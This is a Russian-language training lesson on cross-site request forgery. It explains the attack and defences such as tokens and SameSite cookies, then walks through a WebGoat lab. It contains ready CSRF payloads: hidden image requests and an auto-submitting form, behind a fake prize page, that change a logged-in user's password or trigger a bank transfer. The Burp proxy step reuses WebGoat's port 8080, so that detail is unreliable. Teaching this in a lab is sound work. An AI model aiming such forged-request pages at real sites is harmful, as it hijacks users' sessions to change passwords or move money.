# Занятие 22. CSRF: Как работает, практика на WebGoat

## Теория

**CSRF (Cross-Site Request Forgery)** — подделка межсайтовых запросов. Атака заставляет авторизованного пользователя выполнить нежелательные действия на веб-приложении, используя его активную сессию.

### Механизм работы CSRF

1. Пользователь входит в уязвимый сайт (например, bank.com) и получает cookie сессии
2. Пользователь открывает вредоносную страницу (evil.com), не выходя из bank.com
3. Вредоносная страница отправляет запрос к bank.com (например, перевод денег)
4. Браузер автоматически прикрепляет cookie сессии к запросу
5. Сайт bank.com обрабатывает запрос как легитимный

### Условия успешной CSRF-атаки

- Пользователь авторизован на целевом сайте
- Запрос можно предсказать (параметры известны)
- Сайт не проверяет CSRF-токен или другие защитные механизмы

### Пример уязвимого запроса

```
GET /transfer?to=attacker&amount=1000 HTTP/1.1
Host: bank.com
Cookie: session=abc123
```

Вредоносная страница:
```html
<img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none">
```

### Методы защиты от CSRF

1. **CSRF-токены**: Уникальное значение, проверяемое сервером при каждом запросе
2. **SameSite Cookie**: Атрибут `SameSite=Strict` или `Lax` запрещает отправку cookie с чужих сайтов
3. **Проверка Referer/Origin**: Сервер проверяет, откуда пришел запрос
4. **Двухфакторная аутентификация**: Дополнительное подтверждение действий

## Практическое занятие

### Настройка WebGoat

1. Убедитесь, что WebGoat запущен: `docker run -d -p 8080:8080 webgoat/goatandwolf`
2. Откройте http://localhost:8080/WebGoat
3. Войдите под любым именем (значения не важны)

### Практика: CSRF в WebGoat

Перейдите в **Cross-Site Request Forgery (CSRF)** → **CSRF and GET Requests**

**Шаг 1: Изучение легитимного запроса**
WebGoat показывает форму профиля. При отправке формы отправляется GET-запрос:
```
GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1.1
```

**Шаг 2: Создание вредоносной страницы**
Создайте HTML-файл `csrf_attack.html`:
```html
<html>
<body>
  <h1>Поздравляем! Вы выиграли приз!</h1>
  <img src="http://localhost:8080/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" style="display:none">
</body>
</html>
```

**Шаг 3: Выполнение атаки**
1. Откройте WebGoat и убедитесь, что вы авторизованы
2. Откройте файл `csrf_attack.html` в том же браузере
3. Проверьте в WebGoat → **CSRF → Check Password** — новый пароль `hacked` должен сработать

**Шаг 4: CSRF через форму (POST)**
Для POST-запросов используйте авто-отправляемую форму:
```html
<html>
<body>
  <form action="http://localhost:8080/WebGoat/csrf/basic-post" method="POST" id="csrf">
    <input type="hidden" name="newPassword" value="hacked">
    <input type="hidden" name="confirmPassword" value="hacked">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Шаг 5: Проверка в Burp Suite**
1. Настройте прокси в браузере на 127.0.0.1:8080
2. Откройте вредоносную страницу
3. В Burp (Proxy → HTTP history) найдите запрос к WebGoat
4. Проверьте, что запрос содержит cookie сессии

### Скриншоты для отчета

1. **Скриншот 1**: WebGoat — задание CSRF и GET Requests выполнено
2. **Скриншот 2**: Вредоносная страница открыта в браузере
3. **Скриншот 3**: Burp Suite — перехваченный CSRF-запрос с cookie
